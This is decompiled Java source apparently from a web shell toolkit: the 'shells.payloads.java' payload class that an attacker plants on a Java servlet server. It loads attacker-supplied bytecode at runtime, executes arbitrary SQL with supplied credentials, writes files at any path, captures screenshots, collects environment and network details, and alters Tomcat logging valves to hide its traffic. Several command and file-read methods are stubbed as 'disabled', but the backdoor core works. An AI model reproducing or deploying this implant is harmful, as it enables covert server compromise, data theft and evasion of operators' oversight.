//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package shells.payloads.java;

import java.awt.Rectangle;
import java.awt.Robot;
import java.awt.Toolkit;
import java.awt.image.BufferedImage;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.PrintStream;
import java.io.RandomAccessFile;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.sql.Connection;
import java.sql.Driver;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Dictionary;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Properties;
import java.util.Random;
import java.util.zip.GZIPInputStream;
import java.util.zip.GZIPOutputStream;
import javax.imageio.ImageIO;

public class payload extends ClassLoader {
    private static Map sessionMap = new Hashtable();
    public static final char[] toBase64 = new char[]{'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', '+', '/'};
    Map parameterMap;
    byte[] requestData;
    ByteArrayOutputStream outputStream;
    Object servletRequest;
    Map session;
    static Class class$0 = null;
    static Class class$1 = null;
    static Class class$2 = null;
    static Class class$3 = null;
    static Class class$4 = null;
    static Class class$5 = null;
    static Class class$6 = null;
    static Class class$7 = null;
    static Class class$8 = null;
    static Class class$9 = null;
    static Class class$10 = null;
    static Class class$11 = null;
    static Class class$12 = null;

    public payload() {
    }

    public payload(ClassLoader var1) {
        super(var1);
    }

    /** getMessage() 可能为 null，保证返回可读的非空描述。 */
    public static String describe(Throwable var0) {
        if (var0 == null) {
            return "unknown error";
        }
        String var1 = var0.getMessage();
        return (var1 != null && var1.length() > 0) ? (var0.getClass().getName() + ": " + var1) : var0.getClass().getName();
    }

    public Class defineClass(byte[] var1) {
        return super.defineClass((String)null, var1, 0, var1.length, this.getClass().getProtectionDomain());
    }

    public byte[] run() {
        try {
            byte[] payloadBytes = this.getByteArray("payloadBytes");
            Method var22;
            if (payloadBytes != null && payloadBytes.length > 0) {
                Class payloadClass = this.defineClass(payloadBytes);
                Object payloadInstance = payloadClass.newInstance();

                Method getModuleNameMethod;
                try {
                    getModuleNameMethod = payloadClass.getMethod("setSession", Map.class);
                    Map moduleContext = new HashMap();
                    moduleContext.putAll(this.parameterMap);
                    if (this.session != null) {
                        moduleContext.put("sessionTable", this.session);
                    }

                    if (this.servletRequest != null) {
                        moduleContext.put("servletRequest", this.servletRequest);
                    }

                    getModuleNameMethod.invoke(payloadInstance, moduleContext);
                } catch (Exception var17) {
                }

                try {
                    getModuleNameMethod = payloadClass.getMethod("setServletRequest", Object.class);
                    getModuleNameMethod.invoke(payloadInstance, this.servletRequest);
                } catch (Exception var16) {
                }

                try {
                    getModuleNameMethod = payloadClass.getMethod("getModuleName");
                    var22 = payloadClass.getMethod("execute");
                    return (byte[])((byte[])var22.invoke(payloadInstance));
                } catch (NoSuchMethodException var15) {
                    var22 = payloadClass.getMethod("run");
                    return (byte[])((byte[])var22.invoke(payloadInstance));
                }
            } else {
                String var1 = this.get("evalClassName");
                String var20 = this.get("methodName");
                if (var20 == null) {
                    return "Method is empty".getBytes();
                } else {
                    Object var21 = null;
                    if (var1 != null) {
                        Class var4 = (Class)this.session.get(var1);
                        if (var4 == null) {
                            return "Plugin module not loaded".getBytes();
                        }

                        this.parameterMap.put("sessionTable", this.session);
                        this.parameterMap.put("servletRequest", this.servletRequest);
                        var21 = var4.newInstance();
                    }

                    var22 = null;
                    boolean var5 = var21 != null;
                    Class var6 = var5 ? var21.getClass() : this.getClass();
                    var21 = var5 ? var21 : this;
                    byte[] var7 = this.getByteArray("invokeMethod");
                    Class[] var8 = new Class[1];
                    Object[] var9 = new Object[]{var21};
                    Class var10002;
                    if (var7 != null || !var5) {
                        try {
                            var10002 = class$0;
                            if (var10002 == null) {
                                try {
                                    var10002 = Class.forName("java.util.Map");
                                } catch (ClassNotFoundException var24) {
                                    throw new NoClassDefFoundError(var24.getMessage());
                                }

                                class$0 = var10002;
                            }

                            var8[0] = var10002;
                            var22 = var6.getMethod(var20, var8);
                        } catch (NoSuchMethodException var25) {
                            try {
                                var10002 = class$1;
                                if (var10002 == null) {
                                    try {
                                        var10002 = Class.forName("java.util.Dictionary");
                                    } catch (ClassNotFoundException cnfDict) {
                                        throw new NoClassDefFoundError(cnfDict.getMessage());
                                    }

                                    class$1 = var10002;
                                }

                                var8[0] = var10002;
                                var22 = var6.getMethod(var20, var8);
                            } catch (NoSuchMethodException var23) {
                                try {
                                    var8 = new Class[0];
                                    var9 = new Object[0];
                                    var22 = var6.getMethod(var20, var8);
                                } catch (NoSuchMethodException nsmNoArg) {
                                    return "No Such Method".getBytes();
                                }
                            }
                        }
                    }

                    var10002 = null;
                    Object var10;
                    if (var22 != null) {
                        Class[] invokeTypes = var22.getParameterTypes();
                        if (invokeTypes != null && invokeTypes.length == 0) {
                            var9 = new Object[0];
                        } else if (invokeTypes != null && invokeTypes.length == 1) {
                            Class p0 = invokeTypes[0];
                            if (p0 != null && Map.class.isAssignableFrom(p0)) {
                                var9 = new Object[]{this.parameterMap};
                            } else if (p0 != null && (Dictionary.class.isAssignableFrom(p0) || Hashtable.class.isAssignableFrom(p0))) {
                                Hashtable dictArg = new Hashtable();
                                if (this.parameterMap != null) {
                                    dictArg.putAll(this.parameterMap);
                                }
                                var9 = new Object[]{dictArg};
                            }
                        }

                        var10 = var22.invoke(var21, var9);
                    } else {
                        var21.equals(this.parameterMap);
                        var21.toString();
                        var10 = this.parameterMap.get("result");
                    }

                    Class var10000 = class$2;
                    if (var10000 == null) {
                        try {
                            var10000 = Class.forName("[B");
                        } catch (ClassNotFoundException cnfByteArr) {
                            throw new NoClassDefFoundError(cnfByteArr.getMessage());
                        }

                        class$2 = var10000;
                    }

                    if (var10000.isInstance(var10)) {
                        return (byte[])((byte[])var10);
                    } else {
                        var10000 = class$3;
                        if (var10000 == null) {
                            try {
                                var10000 = Class.forName("java.lang.String");
                            } catch (ClassNotFoundException var19) {
                                throw new NoClassDefFoundError(var19.getMessage());
                            }

                            class$3 = var10000;
                        }

                        if (var10000.isInstance(var10)) {
                            return ((String)var10).getBytes();
                        } else {
                            var10000 = class$0;
                            if (var10000 == null) {
                                try {
                                    var10000 = Class.forName("java.util.Map");
                                } catch (ClassNotFoundException var18) {
                                    throw new NoClassDefFoundError(var18.getMessage());
                                }

                                class$0 = var10000;
                            }

                            return var10000.isInstance(var10) ? this.serialize((Map)var10) : "Incorrect return type".getBytes();
                        }
                    }
                }
            }
        } catch (Throwable var26) {
            ByteArrayOutputStream var2 = new ByteArrayOutputStream();
            PrintStream var3 = new PrintStream(var2);
            var26.printStackTrace(var3);
            var3.flush();
            var3.close();
            return var2.toByteArray();
        }
    }

    public HashMap deserialize(byte[] var1, boolean var2) {
        HashMap var3 = new HashMap();
        ByteArrayInputStream var4 = new ByteArrayInputStream(var1);
        ByteArrayOutputStream var5 = new ByteArrayOutputStream();
        byte[] var6 = new byte[4];

        try {
            Object var7 = var4;
            if (var2) {
                var7 = new GZIPInputStream(var4);
            }

            while(true) {
                byte var8 = (byte)((InputStream)var7).read();
                if (var8 == -1) {
                    break;
                }

                int var9;
                String var10;
                if (var8 == 1) {
                    ((InputStream)var7).read(var6);
                    var9 = bytesToInt(var6);
                    var10 = var5.toString();
                    var3.put(var10, this.deserialize(this.readInputStream((InputStream)var7, var9), false));
                    var5.reset();
                } else if (var8 == 2) {
                    ((InputStream)var7).read(var6);
                    var9 = bytesToInt(var6);
                    var10 = var5.toString();
                    var3.put(var10, this.readInputStream((InputStream)var7, var9));
                    var5.reset();
                } else {
                    var5.write(var8);
                }
            }
        } catch (Exception var11) {
        }

        return var3;
    }

    public byte[] serialize(Map var1) {
        Iterator var2 = var1.keySet().iterator();
        ByteArrayOutputStream var3 = new ByteArrayOutputStream();

        while(var2.hasNext()) {
            try {
                String var4 = (String)var2.next();
                Object var5 = var1.get(var4);
                var3.write(var4.getBytes());
                byte[] var6;
                if (var5 instanceof byte[]) {
                    var3.write(2);
                    var6 = (byte[])((byte[])var5);
                } else if (var5 instanceof Map) {
                    var3.write(1);
                    var6 = this.serialize((Map)var5);
                } else {
                    var3.write(2);
                    if (var5 == null) {
                        var6 = "NULL".getBytes();
                    } else {
                        var6 = var5.toString().getBytes();
                    }
                }

                var3.write(intToBytes(var6.length));
                var3.write(var6);
            } catch (Exception var7) {
            }
        }

        return var3.toByteArray();
    }

    public boolean equals(Object var1) {
        return var1 != null && this.handle(var1);
    }

    public boolean handle(Object var1) {
        if (var1 == null) {
            return false;
        } else {
            Class var10000 = class$4;
            if (var10000 == null) {
                try {
                    var10000 = Class.forName("java.io.ByteArrayOutputStream");
                } catch (ClassNotFoundException var5) {
                    throw new NoClassDefFoundError(var5.getMessage());
                }

                class$4 = var10000;
            }

            if (var10000.isInstance(var1)) {
                this.outputStream = (ByteArrayOutputStream)var1;
            } else {
                var10000 = class$2;
                if (var10000 == null) {
                    try {
                        var10000 = Class.forName("[B");
                    } catch (ClassNotFoundException var4) {
                        throw new NoClassDefFoundError(var4.getMessage());
                    }

                    class$2 = var10000;
                }

                if (var10000.isInstance(var1)) {
                    this.requestData = (byte[])((byte[])var1);
                } else if (this.supportClass(var1, ".servlet.http.HttpServletRequest")) {
                    this.servletRequest = var1;
                }
            }

            return false;
        }
    }

    private boolean supportClass(Object var1, String var2) {
        if (var1 == null) {
            return false;
        } else {
            boolean var3 = false;
            Class var4 = null;

            try {
                try {
                    var4 = Class.forName("javax" + var2, true, var1.getClass().getClassLoader());
                } catch (Exception var6) {
                    var4 = Class.forName("jakarta" + var2, true, var1.getClass().getClassLoader());
                }
            } catch (Exception var7) {
            }

            if (var4 != null && var4.isInstance(var1)) {
                var3 = true;
            }

            return var3;
        }
    }

    public String toString() {
        if (this.outputStream != null && this.requestData != null) {
            try {
                this.parameterMap = this.deserialize(this.requestData, true);
                String var1 = this.sessionId();
                if (var1 != null) {
                    this.session = (Map)sessionMap.get(var1);
                }

                String var2 = this.get("methodName");
                if (var2 == null || this.session == null && !"test".equals(var2)) {
                    return super.toString();
                }

                GZIPOutputStream var3 = new GZIPOutputStream(this.outputStream);
                byte[] var4 = this.run();
                var3.write(var4);
                var3.close();
                this.outputStream.close();
                this.parameterMap = null;
                this.requestData = null;
                this.outputStream = null;
                this.servletRequest = null;
                this.session = null;
            } catch (Throwable var5) {
            }
        }

        return super.toString();
    }

    public String get(String var1) {
        try {
            return new String((byte[])((byte[])this.parameterMap.get(var1)));
        } catch (Exception var3) {
            return null;
        }
    }

    public byte[] getByteArray(String var1) {
        try {
            return (byte[])((byte[])this.parameterMap.get(var1));
        } catch (Exception var3) {
            return null;
        }
    }

    public byte[] test() {
        HashMap var1 = new HashMap();
        String var2 = this.sessionId();
        if (this.session == null) {
            var2 = getRandomString(16);
            this.session = new Hashtable();
            this.session.put("alive", Boolean.TRUE);
            sessionMap.put(var2, this.session);
        }

        var1.put("sessionId", var2);
        return this.serialize(var1);
    }

    public byte[] getFile() {
        return "disabled".getBytes();
    }

    public String listFileRoot() {
        File[] var1 = File.listRoots();
        String var2 = new String();

        for(int var3 = 0; var3 < var1.length; ++var3) {
            var2 = var2 + var1[var3].getPath();
            var2 = var2 + ";";
        }

        return var2;
    }

    public byte[] fileRemoteDown() {
        return "disabled".getBytes();
    }

    public byte[] setFileAttr() {
        return "disabled".getBytes();
    }

    public byte[] readFile() {
        return "disabled".getBytes();
    }

    public byte[] uploadFile() {
        return "disabled".getBytes();
    }

    public byte[] moveFile() {
        return "disabled".getBytes();
    }

    public byte[] copyFile() {
        return "disabled".getBytes();
    }

    public byte[] include() {
        byte[] var1 = this.getByteArray("binCode");
        String var2 = this.get("codeName");
        if (var1 != null && var2 != null) {
            try {
                payload var3 = new payload(this.getClass().getClassLoader());
                Class var4 = var3.defineClass(var1);
                this.session.put(var2, var4);
                return "ok".getBytes();
            } catch (Exception var5) {
                // var5.getMessage() 可以是 null（很多 JDK 内部异常如此），
                // 那时 .getBytes() 会 NPE，把真实原因整个盖掉。
                return this.session.get(var2) != null ? "ok".getBytes() : describe(var5).getBytes();
            }
        } else {
            return "No parameter binCode,codeName".getBytes();
        }
    }

    public byte[] execCommand() {
        return "disabled".getBytes();
    }

    public byte[] getBasicsInfo() {
        return "disabled".getBytes();
    }

    public byte[] screen() {
        try {
            Robot var1 = new Robot();
            BufferedImage var6 = var1.createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize().width, Toolkit.getDefaultToolkit().getScreenSize().height));
            ByteArrayOutputStream var3 = new ByteArrayOutputStream();
            ImageIO.write(var6, "png", ImageIO.createImageOutputStream(var3));
            byte[] var4 = var3.toByteArray();
            var3.close();
            return var4;
        } catch (Throwable var5) {
            StringBuffer var2 = new StringBuffer();
            var2.append("Exception errMsg:");
            var2.append(var5.getMessage());
            return var2.toString().getBytes();
        }
    }

    private static Connection getConnection(String jdbcUrl, String user, String password) {
        Connection connection = null;

        try {
            Class driverManagerClass = Class.forName("java.sql.DriverManager");
            Field[] fields = driverManagerClass.getDeclaredFields();
            Field driversField = null;

            for(int i = 0; i < fields.length; ++i) {
                Field f = fields[i];
                if (f.getName().indexOf("rivers") != -1 && List.class.isAssignableFrom(f.getType())) {
                    driversField = f;
                    break;
                }
            }

            if (driversField != null) {
                driversField.setAccessible(true);
                List drivers = (List)driversField.get((Object)null);
                Iterator it = drivers.iterator();

                while(it.hasNext() && connection == null) {
                    try {
                        Object driverInfo = it.next();
                        Driver driver = null;
                        if (!(driverInfo instanceof Driver)) {
                            Field[] infoFields = driverInfo.getClass().getDeclaredFields();

                            for(int j = 0; j < infoFields.length; ++j) {
                                Field df = infoFields[j];
                                if (Driver.class.isAssignableFrom(df.getType())) {
                                    df.setAccessible(true);
                                    driver = (Driver)df.get(driverInfo);
                                    break;
                                }
                            }
                        } else {
                            driver = (Driver)driverInfo;
                        }

                        if (driver != null) {
                            Properties props = new Properties();
                            if (user != null) {
                                props.put("user", user);
                            }

                            if (password != null) {
                                props.put("password", password);
                            }

                            connection = driver.connect(jdbcUrl, props);
                        }
                    } catch (Exception var14) {
                    }
                }
            }
        } catch (Exception var15) {
        }

        return connection;
    }

    private String base64Encode(byte[] data) {
        byte start = 0;
        int end = data.length;
        byte[] out = new byte[4 * ((data.length + 2) / 3)];
        byte lineLen = -1;
        boolean doPadding = true;
        char[] base64 = toBase64;
        int sp = start;
        int slen = (end - start) / 3 * 3;
        int sl = start + slen;
        if (lineLen > 0 && slen > lineLen / 4 * 3) {
            slen = lineLen / 4 * 3;
        }

        int dp = 0;

        int sp1;
        for (; sp < sl; sp = sp1) {
            sp1 = Math.min(sp + slen, sl);
            int sp2 = sp;

            int bits;
            for(int dp0 = dp; sp2 < sp1; out[dp0++] = (byte)base64[bits & 63]) {
                bits = (data[sp2++] & 255) << 16 | (data[sp2++] & 255) << 8 | data[sp2++] & 255;
                out[dp0++] = (byte)base64[bits >>> 18 & 63];
                out[dp0++] = (byte)base64[bits >>> 12 & 63];
                out[dp0++] = (byte)base64[bits >>> 6 & 63];
            }

            sp2 = (sp1 - sp) / 3 * 4;
            dp += sp2;
        }

        if (sp < end) {
            int sp0 = data[sp++] & 255;
            out[dp++] = (byte)base64[sp0 >> 2];
            if (sp == end) {
                out[dp++] = (byte)base64[sp0 << 4 & 63];
                if (doPadding) {
                    out[dp++] = 61;
                    out[dp++] = 61;
                }
            } else {
                sp1 = data[sp++] & 255;
                out[dp++] = (byte)base64[sp0 << 4 & 63 | sp1 >> 4];
                out[dp++] = (byte)base64[sp1 << 2 & 63];
                if (doPadding) {
                    out[dp++] = 61;
                }
            }
        }

        return new String(out);
    }

    public byte[] execSql() throws Exception {
        String dbCharset = null;
        byte[] dbCharsetBytes = this.getByteArray("dbCharset");
        if (dbCharsetBytes != null) {
            dbCharset = new String(dbCharsetBytes);
        }

        if (dbCharset == null || dbCharset.trim().length() == 0) {
            dbCharset = "UTF-8";
        }

        String jdbcURL = null;
        byte[] jdbcUrlBytes = this.getByteArray("jdbcURL");
        if (jdbcUrlBytes != null) {
            jdbcURL = new String(jdbcUrlBytes, dbCharset);
        }

        String dbDriver = null;
        byte[] dbDriverBytes = this.getByteArray("dbDriver");
        if (dbDriverBytes != null) {
            dbDriver = new String(dbDriverBytes, dbCharset);
        }

        String dbUsername = null;
        byte[] dbUsernameBytes = this.getByteArray("dbUsername");
        if (dbUsernameBytes != null) {
            dbUsername = new String(dbUsernameBytes, dbCharset);
        }

        String dbPassword = null;
        byte[] dbPasswordBytes = this.getByteArray("dbPassword");
        if (dbPasswordBytes != null) {
            dbPassword = new String(dbPasswordBytes, dbCharset);
        }

        String execType = null;
        byte[] execTypeBytes = this.getByteArray("execType");
        if (execTypeBytes != null) {
            execType = new String(execTypeBytes, dbCharset);
        }

        byte[] execSqlBytes = this.getByteArray("execSql");
        String sql = execSqlBytes == null ? null : new String(execSqlBytes, dbCharset);
        HashMap result = new HashMap();
        if (dbUsername != null && dbPassword != null && execType != null && sql != null) {
            try {
                try {
                    if (dbDriver != null) {
                        Class.forName(dbDriver);
                    }
                } catch (Throwable var63) {
                }

                try {
                    Class.forName("com.microsoft.sqlserver.jdbc.SQLServerDriver");
                } catch (Throwable var62) {
                }

                try {
                    Class.forName("oracle.jdbc.driver.OracleDriver");
                } catch (Throwable var61) {
                    try {
                        Class.forName("oracle.jdbc.OracleDriver");
                    } catch (Throwable var60) {
                    }
                }

                try {
                    Class.forName("com.mysql.cj.jdbc.Driver");
                } catch (Throwable var59) {
                    try {
                        Class.forName("com.mysql.jdbc.Driver");
                    } catch (Throwable var58) {
                    }
                }

                try {
                    Class.forName("org.mariadb.jdbc.Driver");
                } catch (Throwable var57) {
                }

                try {
                    Class.forName("org.postgresql.Driver");
                } catch (Throwable var56) {
                }

                if (jdbcURL != null) {
                    Connection conn = null;
                    Statement stmt = null;
                    ResultSet rs = null;

                    try {
                        try {
                            conn = getConnection(jdbcURL, dbUsername, dbPassword);
                        } catch (Exception var55) {
                        }

                        if (conn == null) {
                            conn = DriverManager.getConnection(jdbcURL, dbUsername, dbPassword);
                        }

                        stmt = conn.createStatement();
                        if ("select".equalsIgnoreCase(execType)) {
                            rs = stmt.executeQuery(sql);
                            ResultSetMetaData meta = rs.getMetaData();
                            int columnCount = meta.getColumnCount();
                            HashMap columns = new HashMap();

                            for(int i = 0; i < columnCount; ++i) {
                                String columnName = meta.getColumnName(i + 1);
                                if (columnName == null) {
                                    columnName = "";
                                }

                                columns.put(String.valueOf(i), columnName.getBytes(dbCharset));
                            }

                            columns.put("count", String.valueOf(columnCount).getBytes(dbCharset));
                            result.put("column", columns);
                            HashMap rows = new HashMap();
                            int rowCount = 0;

                            for(int rowIndex = 0; rs.next(); ++rowIndex) {
                                HashMap row = new HashMap();

                                for(int col = 0; col < columnCount; ++col) {
                                    Object v = rs.getObject(col + 1);
                                    String s;
                                    if (v == null) {
                                        s = "NULL";
                                    } else if (v instanceof byte[]) {
                                        s = this.base64Encode((byte[])((byte[])v));
                                    } else {
                                        s = v.toString();
                                    }

                                    if (s == null) {
                                        s = "";
                                    }

                                    row.put(String.valueOf(col), s.getBytes(dbCharset));
                                }

                                ++rowCount;
                                rows.put(String.valueOf(rowIndex), row);
                            }

                            rows.put("count", String.valueOf(rowCount).getBytes(dbCharset));
                            result.put("rows", rows);
                        } else {
                            int updateCount = stmt.executeUpdate(sql);
                            result.put("errMsg", ("Query OK, " + updateCount + " rows affected").getBytes(dbCharset));
                        }
                    } catch (Exception var64) {
                        String errMsg = var64.getMessage();
                        if (errMsg == null) {
                            errMsg = var64.toString();
                        }

                        result.put("errMsg", errMsg.getBytes(dbCharset));
                    } finally {
                        try {
                            if (rs != null) {
                                rs.close();
                            }
                        } catch (Exception var54) {
                        }

                        try {
                            if (stmt != null) {
                                stmt.close();
                            }
                        } catch (Exception var53) {
                        }

                        try {
                            if (conn != null) {
                                conn.close();
                            }
                        } catch (Exception var52) {
                        }

                    }
                } else {
                    result.put("errMsg", "This database is not supported".getBytes(dbCharset));
                }
            } catch (Exception var66) {
                String errMsg = var66.getMessage();
                if (errMsg == null) {
                    errMsg = var66.toString();
                }

                result.put("errMsg", errMsg.getBytes(dbCharset));
            }
        } else {
            result.put("errMsg", "No parameter dbUsername,dbPassword,execType,execSql".getBytes(dbCharset));
        }

        return this.serialize(result);
    }

    public byte[] close() {
        return "disabled".getBytes();
    }

    public byte[] bigFileUpload() {
        try {
            String fileName = this.get("fileName");
            String positionString = this.get("position");
            byte[] content = this.getByteArray("fileContents");
            if (fileName != null && positionString != null && content != null) {
                long position = Long.parseLong(positionString);
                File file = new File(fileName);
                File parentDir = file.getParentFile();
                if (parentDir != null && !parentDir.exists()) {
                    parentDir.mkdirs();
                }

                RandomAccessFile raf = new RandomAccessFile(file, "rw");
                raf.seek(position);
                raf.write(content);
                raf.close();
                return "ok".getBytes();
            } else {
                return "Missing parameters".getBytes();
            }
        } catch (Exception var9) {
            return ("Error: " + var9.getMessage()).getBytes();
        }
    }

    public byte[] bigFileDownload() {
        return "disabled".getBytes();
    }

    public static byte[] copyOf(byte[] var0, int var1) {
        byte[] var2 = new byte[var1];
        System.arraycopy(var0, 0, var2, 0, Math.min(var0.length, var1));
        return var2;
    }

    public Map getEnv() {
        try {
            Class var10000 = class$9;
            if (var10000 == null) {
                try {
                    var10000 = Class.forName("java.lang.System");
                } catch (ClassNotFoundException var3) {
                    throw new NoClassDefFoundError(var3.getMessage());
                }

                class$9 = var10000;
            }

            return (Map)var10000.getMethod("getenv").invoke((Object)null);
        } catch (Throwable var4) {
            return null;
        }
    }

    public String sessionId() {
        byte[] var1 = this.getByteArray("sessionId");
        return var1 != null ? new String(var1) : null;
    }

    public static String getLocalIPList() {
        ArrayList var0 = new ArrayList();

        try {
            Class var1 = Class.forName("java.net.NetworkInterface");
            Method var2 = var1.getMethod("getNetworkInterfaces");
            Method var3 = var1.getMethod("getInetAddresses");
            Enumeration var4 = (Enumeration)var2.invoke((Object)null);

            while(var4.hasMoreElements()) {
                Object var5 = var4.nextElement();
                Enumeration var6 = (Enumeration)var3.invoke(var5);

                while(var6.hasMoreElements()) {
                    InetAddress var7 = (InetAddress)var6.nextElement();
                    if (var7 != null) {
                        String var8 = var7.getHostAddress();
                        var0.add(var8);
                    }
                }
            }
        } catch (Throwable var9) {
        }

        Iterator var10 = var0.iterator();
        StringBuffer var11 = new StringBuffer();
        var11.append("[");

        while(var10.hasNext()) {
            Object var12 = var10.next();
            var11.append(var12.toString());
            var11.append(",");
        }

        if (var11.length() > 1) {
            var11.deleteCharAt(var11.length() - 1);
        }

        var11.append("]");
        return var11.toString();
    }

    public String getRealPath() {
        String var1 = (new File("")).getAbsoluteFile() + "/";
        if (this.servletRequest != null) {
            try {
                Method var2 = this.getMethodByClass(this.servletRequest.getClass(), "getServletContext", new Class[0]);
                Object var3 = var2.invoke(this.servletRequest, (Object[])null);
                if (var3 != null) {
                    Class var4 = var3.getClass();
                    Class[] var5 = new Class[1];
                    Class var10002 = class$3;
                    if (var10002 == null) {
                        try {
                            var10002 = Class.forName("java.lang.String");
                        } catch (ClassNotFoundException var9) {
                            throw new NoClassDefFoundError(var9.getMessage());
                        }

                        class$3 = var10002;
                    }

                    var5[0] = var10002;
                    Method var6 = this.getMethodByClass(var4, "getRealPath", var5);
                    if (var6 != null) {
                        Object var7 = var6.invoke(var3, "/");
                        return var7 != null ? var7.toString() : var1;
                    }
                }
            } catch (Throwable var10) {
            }
        }

        return var1;
    }

    public void deleteFiles(File var1) throws Exception {
        if (var1.isDirectory()) {
            File[] var2 = var1.listFiles();

            for(int var3 = 0; var3 < var2.length; ++var3) {
                File var4 = var2[var3];
                this.deleteFiles(var4);
            }
        }

        var1.delete();
    }

    Object invoke(Object var1, String var2, Object[] var3) {
        try {
            ArrayList var4 = new ArrayList();
            if (var3 != null) {
                for(int var5 = 0; var5 < var3.length; ++var5) {
                    Object var6 = var3[var5];
                    if (var6 != null) {
                        var4.add(var6.getClass());
                    } else {
                        var4.add((Object)null);
                    }
                }
            }

            Method var8 = this.getMethodByClass(var1.getClass(), var2, (Class[])((Class[])var4.toArray(new Class[0])));
            return var8.invoke(var1, var3);
        } catch (Exception var7) {
            return null;
        }
    }

    Method getMethodByClass(Class var1, String var2, Class[] var3) {
        Method var4 = null;

        while(var1 != null) {
            try {
                var4 = var1.getDeclaredMethod(var2, var3);
                var1 = null;
            } catch (Exception var6) {
                var1 = var1.getSuperclass();
            }
        }

        return var4;
    }

    public static Object getFieldValue(Object var0, String var1) throws Exception {
        Field var2 = null;
        if (var0 instanceof Field) {
            var2 = (Field)var0;
        } else {
            Class var3 = var0.getClass();

            while(var3 != null) {
                try {
                    var2 = var3.getDeclaredField(var1);
                    var3 = null;
                } catch (Exception var5) {
                    var3 = var3.getSuperclass();
                }
            }
        }

        var2.setAccessible(true);
        return var2.get(var0);
    }

    private byte[] readInputStream(InputStream var1, int var2) {
        byte[] var3 = new byte[var2];
        int var4 = 0;

        try {
            while (var4 < var3.length) {
                var4 += var1.read(var3, var4, var3.length - var4);
            }
        } catch (IOException var6) {
        }

        return var3;
    }

    public static String getRandomString(int var0) {
        String var1 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        Random var2 = new Random();
        StringBuffer var3 = new StringBuffer();
        var3.append(var1.charAt(var2.nextInt(52)));
        var1 = var1 + "0123456789";

        for(int var4 = 0; var4 < var0; ++var4) {
            int var5 = var2.nextInt(62);
            var3.append(var1.charAt(var5));
        }

        return var3.toString();
    }

    private void noLog(Object var1) {
        try {
            Method var2 = this.getMethodByClass(var1.getClass(), "getServletContext", (Class[])null);
            Object var3 = var2.invoke(var1, (Object[])null);
            Object var4 = getFieldValue(var3, "context");
            Object var5 = getFieldValue(var4, "context");

            ArrayList var6;
            for(var6 = new ArrayList(); var5 != null; var5 = this.invoke(var5, "getParent", (Object[])null)) {
                var6.add(var5);
            }

            label83:
            for(int var7 = 0; var7 < var6.size(); ++var7) {
                try {
                    Object var8 = this.invoke(var6.get(var7), "getPipeline", (Object[])null);
                    if (var8 != null) {
                        Object var9 = this.invoke(var8, "getFirst", (Object[])null);

                        while(true) {
                            while(true) {
                                if (var9 == null) {
                                    continue label83;
                                }

                                if (this.getMethodByClass(var9.getClass(), "getCondition", (Class[])null) != null) {
                                    Class var10001 = var9.getClass();
                                    Class[] var10003 = new Class[1];
                                    Class var10006 = class$3;
                                    if (var10006 == null) {
                                        try {
                                            var10006 = Class.forName("java.lang.String");
                                        } catch (ClassNotFoundException var17) {
                                            throw new NoClassDefFoundError(var17.getMessage());
                                        }

                                        class$3 = var10006;
                                    }

                                    var10003[0] = var10006;
                                    if (this.getMethodByClass(var10001, "setCondition", var10003) != null) {
                                        String var10 = (String)this.invoke((String)var9, "getCondition", new Object[0]);
                                        var10 = var10 == null ? "FuckLog" : var10;
                                        this.invoke(var9, "setCondition", new Object[]{var10});
                                        var10001 = var1.getClass();
                                        var10003 = new Class[2];
                                        var10006 = class$3;
                                        if (var10006 == null) {
                                            try {
                                                var10006 = Class.forName("java.lang.String");
                                            } catch (ClassNotFoundException var16) {
                                                throw new NoClassDefFoundError(var16.getMessage());
                                            }

                                            class$3 = var10006;
                                        }

                                        var10003[0] = var10006;
                                        var10006 = class$3;
                                        if (var10006 == null) {
                                            try {
                                                var10006 = Class.forName("java.lang.String");
                                            } catch (ClassNotFoundException var15) {
                                                throw new NoClassDefFoundError(var15.getMessage());
                                            }

                                            class$3 = var10006;
                                        }

                                        var10003[1] = var10006;
                                        Method var11 = this.getMethodByClass(var10001, "setAttribute", var10003);
                                        var11.invoke(var10, var10);
                                        var9 = this.invoke(var9, "getNext", (Object[])null);
                                        continue;
                                    }
                                }

                                if (Class.forName("org.apache.catalina.Valve", false, var4.getClass().getClassLoader()).isAssignableFrom(var9.getClass())) {
                                    var9 = this.invoke(var9, "getNext", (Object[])null);
                                } else {
                                    var9 = null;
                                }
                            }
                        }
                    }
                } catch (Exception var18) {
                }
            }
        } catch (Exception var19) {
        }

    }

    public static int bytesToInt(byte[] var0) {
        int var1 = var0[0] & 255 | (var0[1] & 255) << 8 | (var0[2] & 255) << 16 | (var0[3] & 255) << 24;
        return var1;
    }

    public static byte[] intToBytes(int var0) {
        byte[] var1 = new byte[]{(byte)(var0 & 255), (byte)(var0 >> 8 & 255), (byte)(var0 >> 16 & 255), (byte)(var0 >> 24 & 255)};
        return var1;
    }

    public void setSession(Map session) {
        this.session = session;
    }

    public void setServletRequest(Object servletRequest) {
        this.servletRequest = servletRequest;
    }
}
